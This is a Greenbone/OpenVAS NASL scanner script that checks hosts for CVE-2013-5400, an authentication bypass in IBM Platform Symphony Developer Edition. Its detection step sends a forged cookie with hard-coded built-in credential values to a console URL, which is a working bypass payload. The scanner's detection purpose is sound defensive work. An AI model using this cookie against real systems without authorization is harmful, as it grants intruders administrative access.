if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.804240" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_cve_id( "CVE-2013-5400" );
	script_bugtraq_id( 65616 );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2014-02-19 11:25:08 +0530 (Wed, 19 Feb 2014)" );
	script_name( "IBM Platform Symphony Developer Edition Authentication Bypass Vulnerability" );
	script_tag( name: "summary", value: "This host is running IBM Platform Symphony Developer Edition and is prone to
authentication bypass vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted exploit string via HTTP GET request and check whether it is
able to read the string or not." );
	script_tag( name: "insight", value: "The flaw is in a servlet in the application, which authenticates a user with
built-in credentials." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to gain access to the
local environment." );
	script_tag( name: "affected", value: "IBM Platform Symphony Developer Edition 5.2 and 6.1.x through 6.1.1" );
	script_tag( name: "solution", value: "Apply the workaround" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/87296" );
	script_xref( name: "URL", value: "http://www-01.ibm.com/support/docview.wss?uid=isg3T1020564" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2014 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 18080 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
ibmPort = http_get_port( default: 18080 );
ibmReq = http_get( item: "/platform/index_de.jsp", port: ibmPort );
ibmRes = http_keepalive_send_recv( port: ibmPort, data: ibmReq, bodyonly: TRUE );
if(ContainsString( ibmRes, ">Welcome to IBM Platform Management Console<" ) && ContainsString( ibmRes, "Symphony Developer Edition" )){
	url = "/symgui/framework/main.action";
	cookie = "JSESSIONID=A7D2D8F02709BEC35B4DB60C979EE92B; platform.username=\r\n" + "OG0Q3YUPHWw=\"; DE_GUIplatform.username=\"OG0Q3YUPHWw=\";\r\n" + "DE_GUIplatform.password=\"OG0Q3YUPHWw=\";\r\n" + "DE_GUIplatform.descookie=\"\";\r\n" + "DE_GUIplatform.token=testToken; DE_GUIplatform.userrole=1;\r\n" + "DE_GUIplatform.logindate=1392792773887;\r\n" + "DE_GUIplatform.renewtoken=1392794573887";
	host = http_host_name( port: ibmPort );
	ibmReq = NASLString( "GET ", url, " HTTP/1.0\\r\\n", "Host: ", host, "\\r\\n", "Cookie: ", cookie, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n\\r\\n" );
	ibmRes = http_send_recv( port: ibmPort, data: ibmReq, bodyonly: TRUE );
	if(ibmRes && ContainsString( ibmRes, "IBM Platform Symphony Developer Edition" ) && ContainsString( ibmRes, "\\/symgui\\/pmr\\/workload\\/toapplicationsummary.action" )){
		security_message( ibmPort );
		exit( 0 );
	}
}

